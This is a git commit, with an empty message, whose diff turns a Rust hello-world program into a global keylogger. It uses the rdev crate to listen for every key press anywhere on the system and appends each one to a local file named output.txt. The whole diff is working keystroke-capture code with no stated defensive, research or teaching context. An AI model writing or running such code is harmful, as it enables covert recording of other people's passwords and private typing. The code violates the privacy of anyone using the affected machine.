0e1d775ec4ea9bc395b8a90197932b6afe56671b
Rentoo <dreamYiZ@outlook.com>
2024-06-20 01:41:22 +0800

    -

--- src/main.rs
+++ src/main.rs
@@ -1,3 +1,26 @@
+use std::fs::OpenOptions;
+use std::io::prelude::*;
+use std::sync::Mutex;
+use lazy_static::lazy_static;
+use rdev::{listen, Event, EventType};
+
+lazy_static! {
+    static ref FILE: Mutex<std::fs::File> = Mutex::new(
+        OpenOptions::new()
+            .write(true)
+            .append(true)
+            .create(true)  // 如果文件不存在，就创建一个新的文件
+            .open("output.txt")
+            .unwrap()
+    );
+}
+
 fn main() {
-    println!("Hello, world!");
+    listen(|event| match event.event_type {
+        EventType::KeyPress(key) => {
+            let mut file = FILE.lock().unwrap();
+            writeln!(file, "{:?}", key).unwrap();
+        }
+        _ => (),
+    }).unwrap();
 }
